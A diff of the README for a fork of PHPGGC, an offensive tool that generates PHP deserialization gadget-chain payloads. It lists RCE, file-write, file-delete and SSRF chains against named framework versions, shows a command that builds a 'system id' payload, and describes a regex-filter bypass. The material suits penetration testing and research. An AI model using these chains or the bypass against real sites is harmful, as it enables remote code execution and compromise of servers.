@@ -2,22 +2,26 @@
 
 *PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically*.
 When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of [frohoff's ysoserial](https://github.com/frohoff/ysoserial), but for PHP.
-Currently, the tool supports: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.
+Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.
 
 ## About This Fork
 
 Just adding some of the chains I found.
 
 Here's what I found:
+
 ```
 Laravel/FW1                               <=7.19.1                       file_write       __destruct
 Laravel/RCE7                              <=7.19.1                       rce              __destruct
 ThinkPHP/RCE2                             6.0.0 <= 6.0.3                 rce              __destruct
-Yii/RCE2                                  2.0.0 <= 2.0.13                rce              __destruct
-Yii/RCE3                                  2.0.0 <= 2.0.13                rce              __wakeup
-ZendFramework/RCE4                        ? <= 3.1.3                     rce              __destruct       
+ZendFramework/RCE5                        ? <= 3.1.3                     rce              __destruct
 ThinkPHP/RCE3                             6.0.0 <= 6.0.8                 rce              __destruct
+ThinkPHP/RCE4                             ? <= 5.0.24?                   RCE (PHP code)   __destruct
+ThinkPHP/RCE5                             5.0.24                         RCE (PHP code)   __destruct
+ThinkPHP/RCE6                             ? <= 6.0.9                     RCE (PHP code)   __destruct
+ThinkPHP/RCE7                             ? <= 6.0.9                     RCE (PHP code)   __destruct
 ```
+
 
 ## Requirements
 
@@ -34,56 +38,84 @@ $ ./phpggc -l
 Gadget Chains
 -------------
 
-NAME                                      VERSION                        TYPE             VECTOR         I    
-CodeIgniter4/RCE1                         4.0.0-beta.1 <= 4.0.0-rc.4     rce              __destruct          
-CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.3+           rce              __destruct          
-Doctrine/FW1                              ?                              file_write       __toString     *    
-Drupal7/FD1                               7.0 < ?                        file_delete      __destruct     *    
-Drupal7/RCE1                              7.0.8 < ?                      rce              __destruct     *    
-Guzzle/FW1                                6.0.0 <= 6.3.3+                file_write       __destruct          
-Guzzle/INFO1                              6.0.0 <= 6.3.2                 phpinfo()        __destruct     *    
-Guzzle/RCE1                               6.0.0 <= 6.3.2                 rce              __destruct     *    
-Laminas/FD1                               <= 2.11.2                      file_delete      __destruct          
-Laravel/RCE1                              5.4.27                         rce              __destruct          
-Laravel/RCE2                              5.5.39                         rce              __destruct          
-Laravel/RCE3                              5.5.39                         rce              __destruct     *    
-Laravel/RCE4                              5.5.39                         rce              __destruct          
-Laravel/RCE5                              5.8.30                         rce              __destruct     *    
-Laravel/RCE6                              5.5.*                          rce              __destruct     *    
-Magento/FW1                               ? <= 1.9.4.0                   file_write       __destruct     *    
-Magento/SQLI1                             ? <= 1.9.4.0                   sql_injection    __destruct          
-Monolog/RCE1                              1.18 <= 2.0.2                  rce              __destruct          
-Monolog/RCE2                              1.5 <= 1.17                    rce              __destruct          
-Monolog/RCE3                              1.1.0 <= 1.10.0                rce              __destruct          
-Phalcon/RCE1                              <= 1.2.2                       rce              __wakeup       *    
-Pydio/Guzzle/RCE1                         < 8.2.2                        rce              __toString          
-Slim/RCE1                                 3.8.1                          rce              __toString          
-SwiftMailer/FD1                           -5.4.12+, -6.2.1+              file_delete      __destruct          
-SwiftMailer/FW1                           5.1.0 <= 5.4.8                 file_write       __toString          
-SwiftMailer/FW2                           6.0.0 <= 6.0.1                 file_write       __toString          
-SwiftMailer/FW3                           5.0.1                          file_write       __toString          
-SwiftMailer/FW4                           4.0.0 <= ?                     file_write       __destruct          
-Symfony/FW1                               2.5.2                          file_write       DebugImport    *    
-Symfony/FW2                               3.4                            file_write       __destruct          
-Symfony/RCE1                              3.3                            rce              __destruct     *    
-Symfony/RCE2                              2.3.42 < 2.6                   rce              __destruct     *    
-Symfony/RCE3                              2.6 <= 2.8.32                  rce              __destruct     *    
-Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7    rce              __destruct     *    
-ThinkPHP/RCE1                             5.1.x-5.2.x                    rce              __destruct     *    
-WordPress/Dompdf/RCE1                     <= 0.8.5+                      rce              __destruct     *    
-WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4                 rce              __destruct     *    
-WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+                rce              __toString     *    
-WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+                rce              __destruct     *    
-WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+                  rce              __destruct     *    
-WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+                  rce              __destruct     *    
-WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+                rce              __destruct     *    
-WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6                     rce              __destruct     *    
-Yii/RCE1                                  1.1.20                         rce              __wakeup       *    
-ZendFramework/FD1                         ? <= 1.12.20                   file_delete      __destruct          
-ZendFramework/RCE1                        ? <= 1.12.20                   rce              __destruct     *    
-ZendFramework/RCE2                        1.11.12 <= 1.12.20             rce              __toString     *    
-ZendFramework/RCE3                        2.0.1 <= ?                     rce              __destruct       
-ZendFramework/RCE4                        ? <= 3.1.3                     rce              __destruct       
+NAME                                      VERSION                           TYPE                   VECTOR         I    
+CodeIgniter4/RCE1                         4.0.0-beta.1 <= 4.0.0-rc.4        RCE (Function call)    __destruct          
+CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+              RCE (Function call)    __destruct          
+Doctrine/FW1                              ?                                 File write             __toString     *    
+Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5    File write             __destruct     *    
+Drupal7/FD1                               7.0 < ?                           File delete            __destruct     *    
+Drupal7/RCE1                              7.0.8 < ?                         RCE (Function call)    __destruct     *    
+Guzzle/FW1                                6.0.0 <= 6.3.3+                   File write             __destruct          
+Guzzle/INFO1                              6.0.0 <= 6.3.2                    phpinfo()              __destruct     *    
+Guzzle/RCE1                               6.0.0 <= 6.3.2                    RCE (Function call)    __destruct     *    
+Horde/RCE1                                <= 5.2.22                         RCE (PHP code)         __destruct     *    
+Laminas/FD1                               <= 2.11.2                         File delete            __destruct          
+Laminas/FW1                               2.8.0 <= 3.0.x-dev                File write             __destruct     *    
+Laravel/RCE1                              5.4.27                            RCE (Function call)    __destruct          
+Laravel/RCE2                              5.5.39                            RCE (Function call)    __destruct          
+Laravel/RCE3                              5.5.39                            RCE (Function call)    __destruct     *    
+Laravel/RCE4                              5.5.39                            RCE (Function call)    __destruct          
+Laravel/RCE5                              5.8.30                            RCE (PHP code)         __destruct     *    
+Laravel/RCE6                              5.5.*                             RCE (PHP code)         __destruct     *    
+Laravel/RCE7                              ? <= 8.16.1                       RCE (Function call)    __destruct     *    
+Magento/FW1                               ? <= 1.9.4.0                      File write             __destruct     *    
+Magento/SQLI1                             ? <= 1.9.4.0                      SQL injection          __destruct          
+Monolog/RCE1                              1.4.1<=1.6.1 & 1.17.2<=2.2.0+     RCE (Function call)    __destruct          
+Monolog/RCE2                              1.4.1 <= 2.2.0+                   RCE (Function call)    __destruct          
+Monolog/RCE3                              1.0.2 <= 1.10.0                   RCE (Function call)    __destruct          
+Monolog/RCE4                              ? <= 2.4.4+                       RCE (Command)          __destruct     *    
+Monolog/RCE5                              1.25 <= 2.2.0+                    RCE (Function call)    __destruct          
+Monolog/RCE6                              1.10.0 <= 2.2.0+                  RCE (Function call)    __destruct          
+Monolog/RCE7                              1.10.0 <= 2.2.0+                  RCE (Function call)    __destruct     *    
+Phalcon/RCE1                              <= 1.2.2                          RCE                    __wakeup       *    
+PHPCSFixer/FD1                            <= 2.17.3                         File delete            __destruct          
+PHPCSFixer/FD2                            <= 2.17.3                         File delete            __destruct          
+PHPExcel/FD1                              1.8.2+                            File delete            __destruct          
+PHPExcel/FD2                              <= 1.8.1                          File delete            __destruct          
+PHPExcel/FD3                              1.8.2+                            File delete            __destruct          
+PHPExcel/FD4                              <= 1.8.1                          File delete            __destruct          
+Pydio/Guzzle/RCE1                         < 8.2.2                           RCE (Function call)    __toString          
+Slim/RCE1                                 3.8.1                             RCE (Function call)    __toString          
+Smarty/FD1                                ?                                 File delete            __destruct          
+Smarty/SSRF1                              ?                                 SSRF                   __destruct     *    
+SwiftMailer/FD1                           -5.4.12+, -6.2.1+                 File delete            __destruct          
+SwiftMailer/FW1                           5.1.0 <= 5.4.8                    File write             __toString          
+SwiftMailer/FW2                           6.0.0 <= 6.0.1                    File write             __toString          
+SwiftMailer/FW3                           5.0.1                             File write             __toString          
+SwiftMailer/FW4                           4.0.0 <= ?                        File write             __destruct          
+Symfony/FW1                               2.5.2                             File write             DebugImport    *    
+Symfony/FW2                               3.4                               File write             __destruct          
+Symfony/RCE1                              3.3                               RCE (Command)          __destruct     *    
+Symfony/RCE2                              2.3.42 < 2.6                      RCE (PHP code)         __destruct     *    
+Symfony/RCE3                              2.6 <= 2.8.32                     RCE (PHP code)         __destruct     *    
+Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7       RCE (Function call)    __destruct     *    
+Symfony/RCE5                              5.2.*                             RCE (Function call)    __destruct          
+TCPDF/FD1                                 <= 6.3.5                          File delete            __destruct     *    
+ThinkPHP/RCE1                             5.1.x-5.2.x                       RCE (Function call)    __destruct     *    
+WordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2               RCE (Function call)    __destruct     *    
+WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2       RCE (Function call)    __destruct     *    
+WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2      RCE (Function call)    __toString     *    
+WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2      RCE (Function call)    __destruct     *    
+WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2        RCE (Function call)    __destruct     *    
+WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2        RCE (Function call)    __destruct     *    
+WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2      RCE (Function call)    __destruct     *    
+WordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2             RCE (Function call)    __destruct     *    
+WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2           RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2               RCE (Function call)    __toString     *    
+WordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2             RCE (Function call)    __toString     *    
+WordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2               RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2             RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2               RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2             RCE (Function call)    __destruct     *    
+Yii/RCE1                                  1.1.20                            RCE (Function call)    __wakeup       *    
+Yii2/RCE1                                 <2.0.38                           RCE (Function call)    __destruct     *    
+Yii2/RCE2                                 <2.0.38                           RCE (PHP code)         __destruct     *    
+ZendFramework/FD1                         ? <= 1.12.20                      File delete            __destruct          
+ZendFramework/RCE1                        ? <= 1.12.20                      RCE (PHP code)         __destruct     *    
+ZendFramework/RCE2                        1.11.12 <= 1.12.20                RCE (Function call)    __toString     *    
+ZendFramework/RCE3                        2.0.1 <= ?                        RCE (Function call)    __destruct          
+ZendFramework/RCE4                        ? <= 1.12.20                      RCE (PHP code)         __destruct     *    
+
 ```
 
 Filter gadget chains:
@@ -94,13 +126,14 @@ $ ./phpggc -l laravel
 Gadget Chains
 -------------
 
-NAME                                      VERSION                        TYPE             VECTOR         I    
-Laravel/RCE1                              5.4.27                         rce              __destruct          
-Laravel/RCE2                              5.5.39                         rce              __destruct          
-Laravel/RCE3                              5.5.39                         rce              __destruct     *    
-Laravel/RCE4                              5.5.39                         rce              __destruct          
-Laravel/RCE5                              5.8.30                         rce              __destruct     *    
-Laravel/RCE6                              5.5.*                          rce              __destruct     *    
+NAME            VERSION        TYPE                   VECTOR        I    
+Laravel/RCE1    5.4.27         RCE (Function call)    __destruct         
+Laravel/RCE2    5.5.39         RCE (Function call)    __destruct         
+Laravel/RCE3    5.5.39         RCE (Function call)    __destruct    *    
+Laravel/RCE4    5.5.39         RCE (Function call)    __destruct         
+Laravel/RCE5    5.8.30         RCE (PHP code)         __destruct    *    
+Laravel/RCE6    5.5.*          RCE (PHP code)         __destruct    *    
+Laravel/RCE7    ? <= 8.16.1    RCE (Function call)    __destruct    *
 
 ```
 
@@ -179,6 +212,7 @@ $ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id
 a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
 ```
 
+
 ## PHAR(GGC)
 
 ### History
@@ -231,8 +265,58 @@ This can be useful when for some reason non-ascii characters are not allowed (NU
 ### Plus Numbers
 
 Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as `/O:[0-9]+:`. This is easily bypassed using `O:+123:...` instead of `O:123:`. One can use `--plus-numbers <types>`, or `-n <types>`, to automatically add these `+` signs in front of symbols.
-For instance, to obfuscate objects and strings, one can use: `--n Os`. Please note that since PHP 7.2, only i and d (float) types can have a +.
+For instance, to obfuscate objects and strings, one can use: `--n Os`. Please note that since PHP 7.2, only `i` and `d` (float) types can have a `+`.
 
+### Testing your chain
+
+To test if the gadget chain you want to use works in the targeted environment, jump to your environment's folder and run the chain argument-free, with the `--test-payload` option.
+
+For instance, to test if `Monolog/RCE2` works on Symfony `4.x`:
+
+```
+$ composer create-project symfony/website-skeleton=4.x some_symfony
+$ cd some_symfony
+$ phpggc monolog/rce2 --test-payload
+Trying to deserialize payload...
+SUCCESS: Payload triggered !
+```
+
+The exit code will be `0` if the payload triggered, `1` otherwise.
+
+### Testing your chain against every version of a package
+
+If you wish to know which versions of a package a gadget chain works against, you can use `test-gc-compatibility.py`.
+
+```
+$ ./test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3
+Testing 59 versions for monolog/monolog against 2 gadget chains.
+
+┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
+┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃
+┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
+│ 2.x-dev         │   OK    │      OK      │      KO      │
+│ 2.3.0           │   OK    │      OK      │      KO      │
+│ 2.2.0           │   OK    │      OK      │      KO      │
+│ 2.1.1           │   OK    │      OK      │      KO      │
+│ 2.1.0           │   OK    │      OK      │      KO      │
+│ 2.0.2           │   OK    │      OK      │      KO      │
+│ 2.0.1           │   OK    │      OK      │      KO      │
+│ 2.0.0           │   OK    │      OK      │      KO      │
+│ 2.0.0-beta2     │   OK    │      OK      │      KO      │
+│ 2.0.0-beta1     │   OK    │      OK      │      KO      │
+│ 1.x-dev         │   OK    │      OK      │      KO      │
+│ 1.26.1          │   OK    │      OK      │      KO      │
+│ 1.26.0          │   OK    │      OK      │      KO      │
+│ 1.25.5          │   OK    │      OK      │      KO      │
+│ 1.25.4          │   OK    │      OK      │      KO      │
+                        ...
+│ 1.0.1           │   OK    │      KO      │      KO      │
+│ 1.0.0           │   OK    │      KO      │      KO      │
+│ 1.0.0-RC1       │   OK    │      KO      │      KO      │
+│ dev-main        │   OK    │      OK      │      KO      │
+│ * dev-phpstan   │   OK    │      OK      │      KO      │
+└─────────────────┴─────────┴──────────────┴──────────────┘
+```
 
 # API
 
@@ -282,8 +366,8 @@ Pull requests are more than welcome. Please follow these simple guidelines:
 
 - `__destruct()` is always the best vector
 - Specify at least the version of the library you've built the payload on
-- Refrain from using references unless it is necessary or drastically reduces the size of the payload. If the payload is modified by hand afterwards, this might cause problems.
 - Do not include unused parameters in the gadget definition if they keep their default values. It just makes the payload bigger.
+- Respect code style: for instance, opening brackets `{` are on a new line, and arrays should be written as `[1, 2, 3]` instead of the old, `array(1, 2, 3)`, notation.
 
 Codewise, the directory structure is fairly straightforward: gadgets in _gadgets.php_, description + logic in _chain.php_.
 You can define pre- and post- processing methods, if parameters need to be modified.
@@ -292,6 +376,11 @@ Otherwise, I'd be glad to answer your questions.
 
 The `--new <framework> <type>` command-line option can be used to create the directory and file structure for a new gadget chain.
 For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetchain.
+
+
+# Docker
+
+If you don't want to install PHP, you can use `docker build`.
 
 
 # License
